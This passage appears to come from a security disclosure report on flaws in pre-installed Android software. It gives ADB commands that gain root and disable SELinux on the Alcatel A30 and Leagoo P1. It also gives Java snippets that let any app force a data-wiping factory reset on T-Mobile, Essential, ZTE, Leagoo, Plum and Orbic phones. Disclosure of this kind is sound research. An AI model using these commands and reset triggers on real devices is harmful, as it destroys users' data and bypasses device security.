### 7. Local Root Privilege Escalation via ADB

We identified two devices, the Alcatel A30 and Leagoo P1, that allow users to gain root privileges by entering commands through ADB (Android Debug Bridge). These devices permit a user with physical access to obtain a root shell by allowing the ADB shell user to modify read-only properties at runtime. This undocumented feature contradicts the standard Android security model.

Recently, a Twitter user named Elliot Anderson discovered that certain OnePlus devices can also gain root access via ADB. For more details, see [this XDA Developers article](https://www.xda-developers.com/oneplus-root-access-backdoor/).

Notably, the Alcatel A30 was an Amazon Prime exclusive device. We will focus on the Alcatel A30, although the method to obtain a root shell via ADB is similar for both devices: modifying read-only properties at runtime and restarting the ADB daemon as the root user.

#### 7.1 Alcatel A30 – Root Privilege Escalation via ADB

Allowing the modification of read-only properties at runtime enables either a user with physical access or the vendor (TCL Corporation) to execute commands as the root user. The critical properties are `ro.debuggable` and `ro.secure`. On the Alcatel A30, setting `ro.debuggable` to 1 creates a UNIX domain socket named `factory_test` that executes commands as the root user. This behavior is not present on the Leagoo P1.

This allows the vendor to execute commands as the root user if they change the `ro.debuggable` property and use a process with write access to the `factory_test` socket in the `/dev/socket` directory. Additionally, platform apps can change the `ro.debuggable` property at runtime. TCL Corporation should control the framework key and SELinux rules to manage which processes can interact with the `factory_test` socket.

The end-user can also obtain root privileges by restarting ADB as root using specific ADB commands. This allows the user to execute commands as the root user, enabling permanent root access. With root privileges, private directories of apps can be examined and exfiltrated. To achieve this, set `ro.debuggable` to 1 and `ro.secure` to 0, then use the `adb root` command to restart the ADB daemon as the root user. SELinux can be disabled with the `setenforce 0` command to bypass Mandatory Access Control (MAC) rules.

Below are the ADB commands to obtain a root shell:

```sh
adb shell setprop ro.debuggable 1
adb shell setprop ro.secure 0
adb root
adb shell setenforce 0
adb shell
```

After executing these commands, the user will have root privileges, as shown below:

```sh
MICKEY6US:/ # id
uid=0(root) gid=0(root)
groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
```

The `factory_test` UNIX domain socket in the `/dev/socket` directory of the Alcatel A30 device is as follows:

```sh
MICKEY6US:/dev/socket # ls -al
total 0
drwxr-xr-x  7 root      root       760 2017-05-10 17:58 .
drwxr-xr-x 15 root      root      4220 2017-05-10 17:55 ..
srw-rw----  1 system    system       0 2017-05-10 17:58 adbd
srw-rw----  1 root      inet         0 1970-11-08 00:12 cnd
srw-rw----  1 root      mount        0 1970-11-08 00:12 cryptd
srw-rw----  1 root      inet         0 1970-11-08 00:12 dnsproxyd
srw-rw----  1 root      system       0 1970-11-08 00:12 dpmd
srw-rw----  1 system    inet         0 2017-05-10 17:55 dpmwrapper
srw-rw-rw-  1 root      root         0 2017-05-10 17:58 factory_test
```

The `init.rc` file on the Alcatel A30 contains the logic to start the `/system/bin/factory_test` binary when `ro.debuggable` is set to 1:

```sh
on property:ro.debuggable=1
    start bt_wlan_daemon
service bt_wlan_daemon /system/bin/factory_test
    user root
    group root
    oneshot
    seclabel u:r:bt_wlan_daemon:s0
```

#### 7.2 Leagoo P1 – Root Privilege Escalation via ADB

Similar behavior (excluding the `factory_test` socket) is present on the Leagoo P1 device with build fingerprint `sp7731c_1h10_32v4_bird:6.0/MRA58K/android.20170629.214736:user/release-keys`. The ADB commands to obtain a root shell are the same as for the Alcatel A30:

```sh
adb shell setprop ro.debuggable 1
adb shell setprop ro.secure 0
adb root
adb shell setenforce 0
adb shell
t592_otd_p1:/ # id
uid=0(root) gid=0(root)
groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
```

### 8. Programmatically Factory Resetting the Device

A factory reset wipes the data and cache partitions, removing all installed apps and user data. An unintentional factory reset can cause significant data loss. For an app to perform a factory reset, it must have the `MASTER_CLEAR` permission, which is only granted to pre-installed apps. Third-party apps cannot directly factory reset the device unless they are enabled as Mobile Device Management (MDM) apps.

All vulnerabilities we found involve privileged apps (those with the `MASTER_CLEAR` permission and platform apps) exposing an interface that, when called, initiates a factory reset. A privileged app can initiate a factory reset by sending a broadcast intent with the action `android.intent.action.MASTER_CLEAR`. The `com.android.server.MasterClearReceiver` component in the `system_server` process handles this action, booting the device into recovery mode to format the data and cache partitions.

#### 8.1 T-Mobile Revvl Plus & T-Mobile Coolpad Defiant – Factory Reset

The T-Mobile Revvl Plus and T-Mobile Coolpad Defiant have a pre-installed app (`com.qualcomm.qti.telephony.extcarrierpack`, versionCode=25, versionName=7.1.1) that executes as the system user. This app contains a broadcast receiver (`com.qualcomm.qti.telephony.extcarrierpack.UiccReceiver`) that, upon receiving a broadcast intent with the action `com.tmobile.oem.RESET`, initiates a factory reset by sending a `MASTER_CLEAR` broadcast. The following code initiates a factory reset:

```java
sendBroadcast(new Intent("com.tmobile.oem.RESET"));
```

#### 8.2 Essential Phone – Factory Reset

The vulnerability lies in the `com.ts.android.hiddenmenu` app (versionName=1.0, platformBuildVersionName=8.1.0), a platform app executing as the system user. The `RTNResetActivity` component is exported, allowing any app to start it. Internally, this component starts other components that send a `MASTER_CLEAR` broadcast, initiating a factory reset. The following code can be used to trigger the reset:

```java
Intent i = new Intent();
i.setClassName("com.ts.android.hiddenmenu", "com.ts.android.hiddenmenu.rtn.RTNResetActivity");
startActivity(i);
```

#### 8.3 ZTE Zmax Champ – Factory Reset

The `com.zte.zdm.sdm` app (versionCode=31, versionName=V5.0.3) on the ZTE Zmax Champ is a system app that can programmatically factory reset the device. It has a broadcast receiver (`com.zte.zdm.VdmcBroadcastReceiver`) that, upon receiving a `DM_FATORY_RESET_TEST_BY_TOOL` broadcast, writes `--wipe_data` to `/cache/recovery/command` and reboots into recovery mode. The following code triggers the reset:

```java
sendBroadcast(new Intent("android.intent.action.DM_FATORY_RESET_TEST_BY_TOOL"));
```

#### 8.4 Leagoo Z5C – Factory Reset

The `com.android.settings` app (versionCode=23, versionName=6.0-android.20170630.092853) on the Leagoo Z5C has an exported broadcast receiver (`com.sprd.settings.PhoneTrackCommandReceiver`). When this receiver receives a `phonetrack_masterclear` broadcast, it sends a `MASTER_CLEAR` broadcast, initiating a factory reset. The following code triggers the reset:

```java
sendBroadcast(new Intent("android.intent.action.phonetrack_masterclear"));
```

#### 8.5 Leagoo P1 – Factory Reset

The `com.wtk.factory` app (versionCode=1, versionName=1.0) on the Leagoo P1 is a platform app that requests the `MASTER_CLEAR` permission. It has a broadcast receiver (`MMITestReceiver`) that, upon receiving a `com.mmi.helper.request` broadcast, sends a `MASTER_CLEAR` broadcast. The following code triggers the reset:

```java
Intent i2 = new Intent();
i2.setAction("com.mmi.helper.request");
i2.setClassName("com.wtk.factory", "com.wtk.factory.MMITestReceiver");
i2.putExtra("type", "factory_reset");
i2.putExtra("value", "100");
sendBroadcast(i2);
```

#### 8.6 Plum Compass – Factory Reset

The `com.android.settings` app (versionCode=23, versionName=6.0-eng.root.20161223.224055) on the Plum Compass is a platform app that requests the `MASTER_CLEAR` permission. It has a broadcast receiver (`FactoryReceiver`) that, upon receiving a broadcast, sends a `MASTER_CLEAR` broadcast. The following code triggers the reset:

```java
Intent i = new Intent();
i.setClassName("com.android.settings", "com.android.settings.FactoryReceiver");
sendBroadcast(i);
```

#### 8.7 Orbic Wonder – Factory Reset

The core Android package (package name `android`) on the Orbic Wonder contains a broadcast receiver (`com.android.server.MasterClearReceiver`) that, upon receiving a broadcast, initiates a factory reset. The following code triggers the reset:

```java
Intent i2 = new Intent();
i2.setClassName("android", "com.android.server.MasterClearReceiver");
sendBroadcast(i2);
```

For more information, please contact:
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL